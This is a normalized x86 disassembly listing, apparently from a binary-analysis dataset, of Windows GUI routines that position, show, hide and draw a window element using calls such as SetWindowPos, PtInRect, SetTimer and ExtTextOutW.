add eax ecx
mov [ esp + 0x70 ] eax
sub eax edx
mov edx ecx
sub edx [ esp + 0x30 ]
cmp edx eax
jge r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x44 ]
sub ecx eax
sub ecx [ esp + 0x14 ]
add ecx [ esp + 0x3c ]
cmp esi ecx
jle r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x68 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x70 ] edx
mov edx ecx
sub edx [ esp + 0x44 ]
mov [ esp + 0x6c ] ecx
mov ecx [ esp + 0x3c ]
sub edx eax
mov [ esp + 0x64 ] eax
add eax [ esp + 0x24 ]
add edx ecx
mov [ esp + 0x64 ] eax
cmp esi edx
jge r-xdata
mov esi [ esp + 0x4c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x68 ] ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x6c ] ecx
sub ecx eax
add ecx [ esp + 0x3c ]
mov [ esp + 0x64 ] edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x64 ] ecx
mov ecx eax
sub ecx [ esp + 0x1c ]
mov [ esp + 0x70 ] edx
sub ecx [ esp + 0x3c ]
mov edx [ esp + 0x48 ]
add ecx [ esp + 0x14 ]
sub edx [ esp + 0x40 ]
add ecx [ esp + 0x64 ]
add edx [ esp + 0x68 ]
add ecx esi
mov [ esp + 0x6c ] ecx
mov ecx [ esp + 0x3c ]
sub eax ecx
add edi ecx
mov ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x74 ] edx
add eax edi
lea edx [ esp + 0x78 ]
push edx
mov edx [ esp + 0x30 ]
mov [ esp + 0x84 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x14 ]
lea ecx [ esp + 0x6c ]
push ecx
push edx
mov ecx ebx
mov [ esp + 0x84 ] edi
call eax
sub ecx [ esp + 0x44 ]
add [ esp + 0x6c ] ecx
sub eax [ esp + 0x34 ]
add eax esi
add eax [ esp + 0x2c ]
mov [ esp + 0x6c ] eax
jmp r-xdata
mov eax [ esp + 0x5c ]
sub eax [ esp + 0x54 ]
mov edx [ esp + 0x58 ]
add eax [ esp + 0x68 ]
mov [ esp + 0x70 ] eax
mov eax [ esp + 0x50 ]
lea ecx [ eax + edi ]
sub edx eax
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
add edx ecx
mov [ esp + 0x74 ] ecx
mov ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x80 ] edx
lea edx [ esp + 0x78 ]
push edx
mov edx [ esp + 0x30 ]
lea ecx [ esp + 0x6c ]
push ecx
push edx
mov ecx ebx
call eax
sub_4363b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x6c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x68 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1a0 ]
mov ecx edi
and ecx [ esi + 0x1a4 ]
mov [ esp + 0x1c ] eax
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ esi + 0x4 ]
lea ecx [ ecx + 0xb0 ]
lea ebx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x14 ] 0x3
call sub_414260
mov ecx [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov edx [ esi + 0x1a8 ]
and edx [ esi + 0x1ac ]
cmp edx ecx
jne r-xdata
mov ecx [ esp + 0x74 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ecx + 0x10 ]
xor eax eax
mov [ esp + 0x14 ] ebx
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1b0 ]
and eax [ esi + 0x1b4 ]
cmp eax ecx
jne r-xdata
and edi [ esi + 0x1a4 ]
mov [ esp + 0x54 ] eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ esi + 0x1b8 ]
and ecx [ esi + 0x1bc ]
cmp ecx 0xffffffff
je r-xdata
mov eax [ esi + 0x1a8 ]
and eax [ esi + 0x1ac ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x30 ]
mov eax [ esi + 0x38 ]
mov ecx [ esi + 0x3c ]
mov edi [ esi + 0x34 ]
mov [ esp + 0x20 ] edx
mov edx [ ebx ]
mov edx [ edx + 0xc ]
mov [ esp + 0x28 ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x2c ] ecx
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov ebx [ ebx + 0x10 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esp + 0x38 ] eax
mov [ esp + 0x6c ] eax
mov eax [ esp + 0x2c ]
sub eax ebx
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax edi
mov edi [ esi + 0xb8 ]
xor ecx ecx
mov [ esp + 0x70 ] ebx
add ebx eax
sub edi [ esi + 0xb0 ]
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x60 ] ebx
mov ebx [ esi + 0xbc ]
sbb ebx [ esi + 0xb4 ]
sub eax [ esp + 0x20 ]
mov [ esp + 0x34 ] ecx
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] ecx
mov ecx [ esi + 0x1a4 ]
push ecx
mov ecx [ esi + 0x1a0 ]
cdq
push ecx
push edx
push eax
call sub_444a60
push ebx
push edi
push edx
push eax
call sub_444ad0
add eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x54 ] eax
add eax edx
mov [ esp + 0x5c ] eax
cmp eax ecx
jle r-xdata
mov ecx [ esi + 0x1c0 ]
add ecx [ esi + 0x1b0 ]
mov eax [ esi + 0x1c4 ]
adc eax [ esi + 0x1b4 ]
mov edi [ esi + 0xbc ]
mov edx [ esi + 0xb8 ]
cmp eax edi
jg r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov ebx [ ebx + 0x10 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x64 ] eax
mov eax [ esi + 0x3c ]
sub eax ebx
mov [ esp + 0x4c ] ecx
mov [ esp + 0x6c ] ecx
mov ecx [ esi + 0x34 ]
sub eax ecx
xor edx edx
mov [ esp + 0x68 ] edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov ecx [ esi + 0x1ac ]
mov [ esp + 0x70 ] ebx
add ebx eax
mov [ esp + 0x58 ] eax
mov eax [ esi + 0xbc ]
mov [ esp + 0x60 ] ebx
mov ebx [ esi + 0xb8 ]
sub ebx [ esi + 0xb0 ]
push ecx
sbb eax [ esi + 0xb4 ]
mov ecx [ esi + 0x1a8 ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x38 ]
sub eax [ esi + 0x30 ]
push ecx
cdq
push edx
push eax
call sub_444a60
mov ecx [ esp + 0x10 ]
push ecx
push ebx
push edx
push eax
call sub_444ad0
add eax [ esi + 0x30 ]
mov edi [ esp + 0x4c ]
mov edx [ esp + 0x18 ]
mov ecx edi
sub ecx edx
add ecx eax
mov [ esp + 0x54 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x5c ] ecx
cmp ecx eax
jle r-xdata
mov ebx [ esp + 0x14 ]
mov edx [ ebx ]
mov edx [ edx + 0x18 ]
push 0x1
lea eax [ esp + 0x68 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x5c ]
push ecx
push eax
mov ecx ebx
call edx
mov [ esp + 0x5c ] ecx
sub ecx edx
mov [ esp + 0x54 ] ecx
jl r-xdata
mov ebx [ esp + 0x14 ]
mov edx [ ebx ]
mov edx [ edx + 0x18 ]
push 0x1
lea eax [ esp + 0x68 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x5c ]
push ecx
push eax
mov ecx ebx
call edx
sub edx edi
add edx eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x54 ] edx
mov ecx [ esi + 0x1b8 ]
mov eax [ esi + 0x1bc ]
mov edx ecx
and edx eax
cmp edx 0xffffffff
je r-xdata
cmp ecx edx
ja r-xdata
mov edx [ esi + 0x1b0 ]
mov edi [ esi + 0x1b4 ]
mov eax edx
and eax edi
cmp eax 0xffffffff
je r-xdata
cmp edi eax
jl r-xdata
mov ecx [ esi + 0xb8 ]
sub ecx [ esi + 0x1c0 ]
mov eax [ esi + 0xbc ]
sbb eax [ esi + 0x1c4 ]
cmp edi eax
jl r-xdata
jg r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov ebx [ ebx + 0x10 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax ]
lea edx [ ecx + eax ]
mov eax [ esi + 0x34 ]
mov [ esp + 0x50 ] ebx
mov [ esp + 0x70 ] ebx
mov ebx [ esi + 0x3c ]
xor edi edi
mov [ esp + 0x6c ] edx
sub edx ecx
mov [ esp + 0x2c ] ebx
mov ebx [ esi + 0xb8 ]
sub ebx [ esi + 0xb0 ]
mov [ esp + 0x64 ] ecx
mov ecx [ esi + 0xbc ]
sbb ecx [ esi + 0xb4 ]
mov [ esp + 0x24 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x68 ] edi
mov edi [ esi + 0x30 ]
sub eax edi
mov [ esp + 0x20 ] edi
mov edi [ esi + 0x1b4 ]
mov esi [ esi + 0x1b0 ]
push edi
mov [ esp + 0x14 ] edx
cdq
push esi
push edx
push eax
mov [ esp + 0x28 ] ecx
call sub_444a60
mov ecx [ esp + 0x18 ]
push ecx
push ebx
push edx
push eax
call sub_444ad0
mov ebx [ esp + 0x10 ]
mov esi [ esp + 0x50 ]
mov edi [ esp + 0x24 ]
mov ecx eax
mov eax ebx
cdq
sub eax edx
sar eax 0x1
sub ecx eax
mov eax [ esp + 0x2c ]
add ecx [ esp + 0x20 ]
sub eax esi
sub eax edi
cdq
sub eax edx
sar eax 0x1
add eax edi
add esi eax
mov [ esp + 0x58 ] eax
push 0x1
lea eax [ esp + 0x68 ]
push eax
lea eax [ esp + 0x5c ]
mov [ esp + 0x5c ] ecx
add ebx ecx
mov ecx [ esp + 0x1c ]
push eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x6c ] esi
mov [ esp + 0x68 ] ebx
mov edx [ ecx ]
push eax
mov edx [ edx + 0x18 ]
call edx
jg r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
push ecx
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov edi [ ebx + 0x10 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax * 2 ]
add eax ecx
mov [ esp + 0x4c ] eax
mov [ esp + 0x6c ] eax
mov eax [ esi + 0x3c ]
sub eax edi
sub eax [ esi + 0x34 ]
xor edx edx
mov [ esp + 0x68 ] edx
cdq
sub eax edx
sar eax 0x1
add eax [ esi + 0x34 ]
mov [ esp + 0x70 ] edi
add edi eax
mov [ esp + 0x58 ] eax
mov eax [ esi + 0xbc ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x4c ]
sub eax ecx
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x38 ]
sub eax [ esi + 0x30 ]
mov [ esp + 0x60 ] edi
mov edi [ esi + 0xb8 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x64 ] ecx
mov ecx [ esp + 0x34 ]
mov [ esp + 0x30 ] edi
sub edi [ esi + 0x1c0 ]
cdq
sbb ecx [ esi + 0x1c4 ]
push ecx
push edi
push edx
push eax
call sub_444a60
mov ecx [ esp + 0x30 ]
sub ecx [ esi + 0xb0 ]
mov edi [ esp + 0x34 ]
sbb edi [ esi + 0xb4 ]
push edi
push ecx
push edx
push eax
call sub_444ad0
mov edi [ esp + 0x18 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
sar eax 0x1
sub ecx eax
add ecx [ esi + 0x30 ]
mov eax [ esi + 0x38 ]
mov [ esp + 0x54 ] ecx
add ecx edi
mov [ esp + 0x5c ] ecx
cmp ecx eax
jle r-xdata
cmp [ esi + 0xb8 ] ecx
jb r-xdata
sub ecx 0x2
sbb eax 0x0
mov [ esi + 0x1b0 ] ecx
mov [ esi + 0x1b4 ] eax
cmp edx ecx
jbe r-xdata
mov edx [ ebx ]
mov edx [ edx + 0x18 ]
push 0x1
lea eax [ esp + 0x68 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x5c ]
push ecx
push eax
mov ecx ebx
call edx
mov ecx [ esp + 0x10 ]
sub ecx [ esp + 0x4c ]
mov [ esp + 0x5c ] eax
add ecx eax
mov [ esp + 0x54 ] ecx
sub_436920
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x104 ] 0x0
push edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn
cmp [ esi + 0xf8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov [ esi + 0x16c ] eax
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x38 ]
push 0x2
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x10 ] edx
mov edx [ esi + 0x3c ]
push 0x0
push eax
mov [ ebp - 0x8 ] edx
call [ MapWindowPoints@IAT ]
mov ecx [ esi + 0x18 ]
mov eax [ ecx + 0x18 ]
test eax eax
je r-xdata
mov edx [ ecx + 0x60 ]
mov eax [ esi + 0x184 ]
mov ecx [ esi + 0x4 ]
mov edi [ esi + 0x180 ]
mov [ ebp - 0x18 ] eax
lea ecx [ ecx + 0xb0 ]
lea ebx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x24 ] 0x2
call sub_414260
mov ecx [ ebp - 0x20 ]
mov eax [ esi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
nop
mov eax [ ebp - 0x18 ]
mov ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
mov ecx eax
mov eax [ eax + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
push ecx
lea edx [ esi + 0x114 ]
push edx
mov ebx rw-data
call sub_406b60
mov ecx [ ebp - 0x1c ]
add esp 0x8
push edi
push 0x84
push 0x80000000
movzx ebx ax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push ecx
lea eax [ esi + 0xf4 ]
call sub_430650
mov [ rw-data ] edi
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov edi [ ebx + 0xc ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ esi + 0x184 ] eax
mov [ ebp - 0x8 ] ecx
sub ecx eax
mov eax [ ebp - 0x14 ]
add eax edi
mov [ esi + 0x180 ] edi
xor edi edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
cmp [ rw-data ] edi
jne r-xdata
sub_436a80
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi ecx
cmp ebx 0x204
jne r-xdata
mov edx [ edi - 0x70 ]
mov eax [ edx + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
call eax
test al al
je r-xdata
mov eax [ ebp + 0x14 ]
movsx esi ax
shr eax 0x10
movsx ebx ax
push ebx
push esi
lea eax [ edi - 0x40 ]
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp ebx 0x20a
je r-xdata
mov edx [ edi - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0xac ]
push ebx
lea ecx [ edi - 0x70 ]
push esi
push eax
call edx
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
cmp ebx 0x46
jne r-xdata
cmp ebx 0x113
jne r-xdata
mov eax [ esi + 0x190 ]
test eax eax
je r-xdata
cmp ebx 0x2a3
jne r-xdata
cmp [ ebp + 0x10 ] 0x9c
jne r-xdata
mov eax [ esi + 0xf8 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call [ KillTimer@IAT ]
mov [ esi + 0x190 ] 0x0
mov eax [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
mov ecx edi
call sub_434d90
cmp [ edi - 0x49 ] 0x0
mov [ esp + 0xc ] eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov [ edi + 0x124 ] 0x0
call sub_436de0
call sub_436e10
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x1
cmp [ edi - 0x49 ] 0x0
je r-xdata
mov [ esi + 0x194 ] 0x0
jmp r-xdata
push 0x0
push eax
call [ ShowWindow@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0xc ] 0x200
jne r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov [ edi + 0x124 ] 0x1
call sub_436de0
mov eax [ edi + 0x11c ]
mov ecx [ edi + 0x118 ]
push eax
push ecx
mov edx ebx
mov ecx esi
call sub_436cb0
jmp r-xdata
mov eax [ esp + 0xc ]
mov ecx [ edi - 0x6c ]
cmp [ ecx + 0x104 ] 0x0
je r-xdata
movsx eax bx
shr ebx 0x10
movsx ebx bx
push ebx
push eax
lea edx [ edi - 0x40 ]
push edx
mov [ esp + 0x1c ] eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x88 ]
push eax
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
cmp [ edi + 0x124 ] 0x0
mov eax [ esp + 0x10 ]
mov [ edi + 0x118 ] eax
mov [ edi + 0x11c ] ebx
jne r-xdata
mov ecx [ edi + 0x88 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
call [ GetTickCount@IAT ]
sub eax [ edi + 0x128 ]
cmp eax 0x1e
jb r-xdata
cmp [ esi + 0x190 ] 0x0
jne r-xdata
call [ GetTickCount@IAT ]
mov edx [ esp + 0x10 ]
push ebx
push edx
mov edx [ ebp + 0x8 ]
mov ecx esi
mov [ edi + 0x128 ] eax
call sub_436cb0
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ edi + 0x124 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x1f4
push 0x9c
push ecx
call [ SetTimer@IAT ]
mov [ esi + 0x190 ] eax
sub_436cb0
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x60 ]
push edi
push eax
mov edi edx
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
push edi
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] edx
call [ ClientToScreen@IAT ]
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
mov eax [ esi + 0x38 ]
push 0x2
mov [ ebp - 0x10 ] edx
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x3c ]
push 0x0
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
call [ MapWindowPoints@IAT ]
mov eax [ esi + 0x180 ]
mov ecx [ ebp - 0x20 ]
cdq
sub eax edx
sar eax 0x1
sub ecx eax
movsx ebx cx
mov ecx [ ebp - 0x14 ]
sub ecx eax
cmp ebx ecx
jge r-xdata
mov eax [ ebp - 0xc ]
cmp ebx eax
jle r-xdata
mov ebx ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
sub edi [ esi + 0x184 ]
push edx
push eax
call sub_4351f0
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x58 ]
call eax
mov ecx [ ebp - 0x18 ]
mov edx [ eax ]
mov edx [ edx + 0x10 ]
push ecx
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + 0x4 ]
push ecx
push 0xd
push esi
mov ecx eax
call edx
mov ecx esi
call sub_436920
mov eax [ esi + 0xf8 ]
push eax
mov [ ebp - 0x18 ] 0x11
call [ IsWindowVisible@IAT ]
test eax eax
mov eax 0x51
je r-xdata
mov ebx eax
cmp [ esi + 0x188 ] ebx
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ esi + 0xf8 ]
push eax
push 0x0
push 0x0
push edi
push ebx
push 0xffffffff
push ecx
call [ SetWindowPos@IAT ]
cmp [ esi + 0x18c ] edi
je r-xdata
sub_436e30
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0xc ]
mov edi [ esi + 0x1c ]
mov ebx [ edi ]
push eax
push ecx
call sub_4351f0
mov edx [ esi + 0x4 ]
push eax
mov eax [ edx + 0x4 ]
mov edx [ ebx + 0x10 ]
push eax
push 0x204
push esi
mov ecx edi
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_436e70
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
cmp [ esi + 0x1c8 ] 0x0
je r-xdata
mov bl [ ebp + 0x8 ]
cmp [ esi + 0xbc ] 0x0
jg r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
jl r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov [ esi + 0xd9 ] 0x1
cmp [ esi + 0x26 ] 0x0
je r-xdata
xor bl bl
jmp r-xdata
cmp [ esi + 0xb8 ] 0x1388
jae r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x27 ] bl
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_436f00
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x32
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_436f80
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_437010
push ebp
mov ebp esp
push 0xffffffff
push sub_4458d5
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx ]
mov [ ebp - 0x4 ] 0x0
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x70 ]
push eax
push esi
call [ SetBkColor@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x0
push 0x0
add edi 0x30
push edi
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push ebx
push esi
call [ SetBkColor@IAT ]
sub_4370c0
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x33
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_437140
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4371d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4458b5
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov esi [ ecx ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x4 ]
cmp [ eax + 0x94 ] edx
jne r-xdata
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x90 ]
mov eax [ eax + 0x94 ]
push ecx
push eax
push edx
call [ CreatePen@IAT ]
push eax
mov [ ebp - 0x10 ] eax
mov ebx [ SelectObject@IAT ]
push esi
call ebx
mov [ ebp - 0x18 ] eax
mov eax [ edi + 0x4 ]
cmp [ eax + 0xa9 ] 0x0
je r-xdata
mov eax [ eax + 0x70 ]
push eax
push esi
call [ SetBkColor@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x70 ]
push eax
call [ CreateSolidBrush@IAT ]
